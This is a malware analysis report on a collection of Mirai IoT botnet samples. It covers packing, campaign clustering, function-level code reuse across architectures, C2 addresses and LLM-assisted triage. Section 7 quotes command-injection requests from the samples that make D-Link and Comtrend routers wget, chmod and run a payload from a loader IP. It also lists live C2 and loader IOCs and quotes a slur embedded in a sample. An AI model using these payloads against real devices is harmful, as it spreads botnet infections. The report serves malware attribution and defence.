# Mirai7 collection — malware family report

Analysis performed entirely through the BSimVis REST API (`localhost:5001/api`),
collection `mirai7`, algo `unweighted_cosine`. Date of analysis: 2026-07-28.

## 1. Collection at a glance

| Metric | Value |
|---|---|
| Files | 174 (1 ingestion batch) |
| Functions | 34 503 (34 245 indexed, 99.25 %) |
| BSim features | 172 039 |
| First / last seen (sample metadata) | 2025-04-04 → 2026-05-19 |
| Named samples vs. hash-named | 131 / 43 |

Architecture spread (14 Ghidra language IDs) — this is a classic IoT botnet
cross-compilation matrix:

| Arch | Files | | Arch | Files |
|---|---|---|---|---|
| ARM:LE:32:v8 | 42 | | 68000:BE:32 (Coldfire) | 11 |
| MIPS:LE:32 | 31 | | PowerPC:BE:32:e500 | 11 |
| MIPS:BE:32 | 19 | | sparc:BE:32 | 8 |
| x86:LE:32 | 19 | | AARCH64 | 3 |
| SuperH4:LE:32 | 12 | | Loongarch64 / RISCV32 / RISCV64 / MIPS64 | 2/2/2/1 |
| x86:LE:64 | 11 | | | |

AV labels confirm the family: `Unix.Dropper.Mirai-*`, `Unix.Trojan.Mirai-*`,
`Unix.Malware.Mirai-*`, plus 15 samples labelled `Unix.Trojan.Tsunami-*` (Kaiten/
Tsunami lineage, frequently bundled in the same distribution servers). YARA hits:
`Backdoor_Linux_Mirai_*` / `Trojan_Linux_Mirai_*` variants — and `UPX_Protector`
on **55 samples**.

## 2. Packing: half the collection is a stub

54 files expose fewer than 10 functions; 53 of those carry the `UPX_Protector`
YARA hit. Those samples decompile to a 2-function UPX stub, so they are
**analytically empty** for BSim and they poison naive similarity ranking: every
stub-vs-stub pair scores `1.0` with `shared_clusters = 2`.

Practical consequence for any report built on this collection: filter binary
similarity with `min_funcs` (I used `min_funcs=50`). Without it, the top 300
pairs by score are all packed stubs.

Naming convention observed: samples prefixed `p` (`pmips`, `pmpsl`, `parm5`,
`px86_64`, `pm68k`) and the `xnxnxnxnxnxnxnxn<arch>xnxn` set are the packed
variants; the same campaigns also appear unpacked.

## 3. Campaigns inside the collection

Grouping file names by stem (after stripping the arch suffix):

| Campaign stem | Files | Notes |
|---|---|---|
| `boatnet.*` | 33 | largest single build set, 10+ arch targets |
| `p*` / `xnxn*` | 26 | packed builds (UPX) |
| `DEMONS.*` | 14 | own build, own C2 resolver |
| `nuclear.*` | 7 | **symbolised** — retains original Mirai symbol names |
| `iran.mips*`, `mips`, `mipsel`, `cock`, `net`, `dicknet`, `unet`, `swatnet`, `chrome`, `nova.mipsel`, `manji.mpsl`, `tuxnokill.mpsl`, `wife.mpsl`, `m-p.s-l.dick` | 1–3 each | long tail of rebranded forks |

Two C2 addresses are recorded in the file metadata, and each one ties together a
full cross-architecture build set — the strongest infrastructure pivot available:

* `143.20.185.245` — 7 files: x86-64, x86-32 (×2), MIPS:BE, ARM (×3)
* `202.155.10.112` — 6 files: SuperH4, x86-64, SPARC, ARM (×2), PowerPC

Both sets are hash-named (no original filename), so *without* code similarity
they look like 13 unrelated unknowns.

## 4. Binary clustering — how the family splits

`bin_cluster/list` returns an HDBSCAN **dendrogram**, not a flat partition: 100
nodes, root node `174` covering all 174 files at cohesion 0.043. The interesting
level is the leaves — 50 of them covering 145 files.

Selected leaf clusters (cohesion = mean pairwise binary similarity inside the
cluster):

| Cluster | n | Cohesion | Content |
|---|---|---|---|
| 208 | 14 | **1.000** | `boatnet.arm / arm5 / arm6 / arm7` + hash-named twins — one build, one day |
| 206 | 5 | 0.963 | `pmpsl`, `wife.mpsl`, `boatnet.mips`, `pmips` — packed MIPS set |
| 207 | 4 | 1.000 | `boatnet.mpsl` ×3 + hash-named |
| 181 | 4 | 1.000 | `boatnet.ppc` ×4 |
| 246 | 2 | 0.986 | `DEMONS.mpsl` ×2 |
| 273 | 2 | 0.973 | `cock` / `net` — same source, MIPS BE vs MIPS LE |
| 275 | 2 | 1.000 | `iran.mipsel` + hash-named twin |

Key observation: the clusters are organised **by build/campaign, not by
architecture**. Cluster 208 mixes ARM variants of the same campaign, and named
samples repeatedly cluster with hash-named unknowns — which is exactly how you
attribute an unknown sample here.

## 5. Binary similarity — cross-endian, but not cross-ISA

Filtering `bin_sim/search` to `min_funcs=50, min_score=0.5` leaves 89 pairs.
Highlights:

| Score | A | B | Arch A / B | Shared clusters |
|---|---|---|---|---|
| 0.973 | `cock` | `net` | MIPS:BE / MIPS:LE | 583 |
| 0.953 | `32817e09…` | `4854ea67…` | MIPS:BE / MIPS:LE | 509 |
| 0.952 | `pmips` | `pmpsl` | MIPS:BE / MIPS:LE | 220 |
| 0.944 | `iran.mipsel` | `iran.mips` | MIPS:LE / MIPS:BE | 507 |
| 0.991 | `32817e09…` | `iran.mips` | MIPS:BE / MIPS:BE | 518 |

32 of the 89 pairs are cross-architecture — but **all** of them are MIPS BE ↔
MIPS LE. No ARM↔MIPS or x86↔ARM pair survives at the binary level, because BSim
features are lifted from p-code but whole-binary coverage still diverges too much
across ISAs (different libc code paths, different inlining).

The `cock` / `net` diff (`bin_sim/diff`) quantifies it: 583 matched clusters,
8 unique to A, 13 unique to B, score 0.973. That is the same source tree compiled
for two endiannesses, with a handful of functions added on one side.

## 6. Function-level code reuse — the real signal

This is where the cross-ISA link that binary similarity misses shows up.

The collection contains a few **symbolised** samples (`nuclear.*`, `mipsel`,
`cock`, `net`, `dicknet`, `arm7`, `nova.mipsel`) that kept the original Mirai
symbol names: `attack_parse`, `attack_tcp_syn`, `attack_gre_ip`, `scanner_init`,
`killer_init`, `table_init`, `table_lock_val`, `resolve_cnc_addr`, `rand_init`,
`util_local_addr`, `anti_gdb_entry`. They act as a **Rosetta stone**: pivot from a
named function to its similarity cluster, and every `FUN_xxxxxxxx` member of that
cluster in a stripped sample inherits the meaning.

### 6.1 `table_init` — the config-table decryptor, across 8 architectures

The cluster containing `nuclear.arm7:table_init` (uuid `8ec63aa85bd9`, 40 members
in 34 distinct files, cohesion 0.991, avg 95 BSim features) spans:

```
ARM:LE:32 13 | MIPS:LE:32 9 | x86:LE:32 5 | x86:LE:64 4
MIPS:BE:32 3 | SuperH4 3   | PowerPC 2   | sparc 1
```

Tighter sub-nodes of the same branch: uuid `b1da238cc2c6` (37/31 files, 0.995),
`b677fe34552c` (27/22, 0.999), `f28e6d43b032` (25/21, **1.000**).

A separate, smaller cluster (`7faa9a55a27b`, 12 members, 12 files, 0.994) mixes
`table_init` with a function named `xor_init` in another sample — the same
routine renamed by a different fork's author.

Concrete evidence from `function/code`, both members of cluster `f28e6d43b032`:

`nuclear.arm7` (ARM:LE:32, symbolised):
```c
void table_init(void)
{
    void *pvVar1;
    pvVar1 = malloc(6);
    util_memcpy(pvVar1,&DAT_0002fadc,6);
    table._4_2_ = 6;
    table._0_4_ = pvVar1;
    pvVar1 = malloc(7);
    util_memcpy(pvVar1,&DAT_0002faec,7);
    ...
```

`chrome` (x86:LE:64, stripped) — matched purely on BSim features:
```c
void FUN_00407780(void)
{
    undefined8 uVar1;
    uVar1 = FUN_0040aec0(0x13);
    FUN_004080d0(uVar1,"FROSTED IS HERE NIGGA",0x13);
    _DAT_00512678 = 0x13;
    _DAT_00512670 = uVar1;
    uVar1 = FUN_0040aec0(0x36);
    FUN_004080d0(uVar1,&DAT_0040e730,0x36);
    ...
```

Same shape (`malloc` → `memcpy` → store ptr/len into a fixed table, repeated),
different ISA, different bitness, no symbols on the x86-64 side. `FUN_0040aec0`
= `malloc`, `FUN_004080d0` = `util_memcpy`. The x86-64 sample also leaks its
operator branding in cleartext inside the config table: **`FROSTED IS HERE NIGGA`**
— i.e. the `chrome` sample belongs to a "Frosted" rebrand, which no filename or
AV label in the collection told us.

### 6.2 Attack module

`attack_tcp_syn` in `nuclear.arm7` sits in a family of large clusters (357–366
avg features) whose named members are:

`attack_gre_eth`, `attack_gre_ip`, `attack_tcp_ack`, `attack_tcp_legit`,
`attack_tcp_null`, `attack_tcp_sack2`, `attack_tcp_stream`, `attack_tcp_syn`,
`attack_tcp_synr`, `attack_udp_ovhhex`.

They cluster *with each other* (25, 17, 9, 8 members over 3–4 files) because the
Mirai attack handlers are near-identical boilerplate around one packet builder —
useful to know: a cluster here identifies "an attack handler", not a specific
attack. The `attack_udp_ovhhex` member indicates an OVH-targeted UDP flood, and
`attack_gre_*` the GRE floods of the original Mirai leak. All these clusters are
ARM-only — the attack code diverges more per-ISA than `table_init` does.

`attack_parse` (163 features) gives a cleaner pivot: cluster `832a548e5b98`,
5 members over 4 files (`nuclear.arm7`, `arm7`, `DEMONS.arm6`,
`3d1cc5c4c42e43ace192728a05654943`), cohesion 0.998 — two of them stripped
(`FUN_000082e8`, `FUN_0000828c`). So `DEMONS` and the hash-named unknown share
the `nuclear` attack-command parser verbatim.

### 6.3 Killer / anti-analysis / scanner

* `killer_init` — cluster `92c30e6ad61b` (3 files: `arm7`, `ppc`, `sh4`,
  cohesion 0.969, 205 features) and `1c4d8bfd1b65` (4 files across ARM + m68k).
  The killer module (kills competing bots and telnet/ssh daemons) is shared
  across the `nuclear.*` build set.
* `competitiveKiller` — a *renamed* killer in `cock` / `net` / `dicknet`
  (cluster `8a72dcda0ec1`, cohesion 1.000, MIPS BE + MIPS LE). Same job,
  author-specific name → evidence of a distinct fork maintaining its own source.
* `anti_gdb_entry` — cluster `aa8b0376c1e8`, 7 files, cohesion 1.000, spanning
  ARM + MIPS LE + MIPS BE, present in `nuclear.arm7`, `dicknet`,
  `tuxnokill.mpsl` and 3 hash-named samples. Note one member is named
  `rpc_thread_multi` in another sample — a decoy symbol name.
* `scanner_init` — the `mipsel` sample carries an **extended** scanner:
  `dlinkscanner_scanner_init`, `comtrend_scanner`, `huawei_scanner_init`,
  `realtek_scanner_init`, `adb_scanner_init` (310–401 features, cohesion
  0.93–1.00). Exploit-based (not telnet-brute-force) propagation — see §7.

## 7. The `mipsel` fork: exploit propagation and a loader IP

Reading the decompiled scanner strings (`function/code`) turned up the payload
URLs embedded in each exploit, all pointing at **one loader host not present in
any sample's `cc_ip` metadata**:

| Module | Request | Target |
|---|---|---|
| `dlinkscanner_scanner_init` | `GET /login.cgi?cli=aa aa';wget http://37.48.254.120/arm7 -O /tmp/arm7;chmod 777 /tmp/arm7;/tmp/arm7'$` | D-Link command injection |
| `comtrend_scanner` | `GET /ping.cgi?pingIpAddress=google.fr;wget http://37.48.254.120/arm7 …&sessionKey=1039` | Comtrend ADSL `ping.cgi` injection |
| `huawei_scanner_init` | `POST /ctrlt/DeviceUpgrade_1` (Digest auth) | Huawei HG532, CVE-2017-17215 |
| `realtek_scanner_init` | `POST /picsdesc.xml`, SOAPAction `urn:schemas-upnp-org:…` | Realtek SDK UPnP SOAP, CVE-2014-8361 |
| `adb_scanner_init` | — | Android Debug Bridge (5555/tcp) |

**IOCs**: loader `http://37.48.254.120/<arch>`, dropped to `/tmp/<arch>` with
`chmod 777`; HTTP `User-Agent: r00ts3c`.

This fork is a real capability upgrade over stock Mirai (which brute-forces
telnet only), and it is the only sample set in the collection carrying it.

## 8. LLM-assisted triage (`/api/llm/summarize`)

Per-function summaries were generated through the API and written back as notes
(owner `claude-report`). Value: the summaries independently reproduced the
semantics that the clustering had *implied*, without seeing the symbol names.

* `chrome:FUN_00407780` (stripped x86-64) — *"sequentially allocates memory
  blocks of varying sizes and copies static string literals into them, storing
  the resulting pointers and lengths in global variables"*. That is exactly
  Mirai's `table_init`, described from a stripped binary. Independent
  confirmation of the cluster match in §6.1.
* `cock:competitiveKiller` — *"persistent background process that monitors
  active TCP connections … terminates the associated processes via SIGKILL"*,
  parsing `/proc/net/tcp`. Confirms it as the competing-bot killer.
* `nuclear.arm7:killer_init` — forks a watchdog that kills the parent and
  `lock_commands()`; anti-analysis + persistence.
* `nuclear.arm7:attack_parse` — deserialises the C2 attack payload and calls
  `attack_start`.
* `mipsel:comtrend_scanner` — flagged the loader IP `37.48.254.120` and the
  `wget` + `chmod 777` chain, which I then **verified in the raw decompiled
  strings** before using it (see §7). Worth stating explicitly: the LLM output
  was treated as a lead, not as evidence.

## 9. Annotations written back to the collection

All via the API, so they are visible in the UI and reusable by the next analyst.

Function tags (`tags/bulk_add`, applied to whole clusters):

| Tag | Cluster uuid | Functions |
|---|---|---|
| `mirai:config_table` | `8ec63aa85bd9` | 40 (34 files, 8 architectures) |
| `mirai:attack_handler` | `9981d8faef4d` | 25 |
| `mirai:anti_gdb` | `aa8b0376c1e8` | 7 |
| `mirai:attack_parse` | `832a548e5b98` | 5 |
| `mirai:killer` | `92c30e6ad61b` | 3 |
| `mirai:killer_competitive` | `8a72dcda0ec1` | 2 |
| `mirai:scanner_exploit` | `ec3821a244d0`, `89f59cdca8ba` | 4 |

File tags: `c2:143.20.185.245` (7), `c2:202.155.10.112` (6), `packed:upx` (55),
`analysis:stub-only` (54), `campaign:boatnet` (33), `campaign:demons` (14),
`campaign:nuclear` (7), `campaign:frosted` (1), `loader:37.48.254.120` (1).

File notes on `mipsel` (exploit modules + loader IOCs) and `chrome`
(cluster-based attribution + `FROSTED` branding), plus five LLM function notes.

Because the function tags were applied to *cluster members*, every stripped
`FUN_xxxxxxxx` in the collection that shares Mirai's config-table routine is now
labelled `mirai:config_table` — the naming propagates without touching Ghidra.

## 10. Conclusions

1. `mirai7` is **one code base with many rebrands**, not many families. The
   `table_init` config-table routine is shared, essentially unmodified, by 34 of
   the 174 files across 8 architectures — that's the family fingerprint.
2. The visible partitioning is **campaign-driven**: `boatnet` (33), `DEMONS` (14),
   `nuclear` (7, symbolised), `Frosted`/`chrome`, `iran`, `cock`/`net`/`dicknet`,
   plus packed duplicates of the same builds.
3. At least two forks made real source-level changes: the `mipsel` fork added
   exploit scanners (D-Link/Comtrend/Huawei/Realtek/ADB) dropping from loader
   `37.48.254.120`, and the `cock`/`net`/`dicknet` fork renamed the killer to
   `competitiveKiller`.
4. Attribution of the 43 hash-named unknowns is achievable: 13 of them fall onto
   two C2 IPs, and the rest land in high-cohesion binary clusters or in the
   `table_init` / `attack_parse` function clusters with named siblings.
5. 55 UPX-packed samples are dead weight for similarity analysis — unpack and
   re-ingest before drawing statistical conclusions about the collection.

### Recommended follow-ups

* Unpack the 55 UPX samples, re-upload, re-run `cluster/rebuild_all`.
* Bulk-tag the `table_init` cluster members (`tags/bulk_add`) as
  `mirai:config_table` so the naming propagates in the UI.
* Extract the config table contents per sample (the `DAT_*` referenced by
  `table_init`) — that yields C2 domains for the 161 samples with no `cc_ip`.
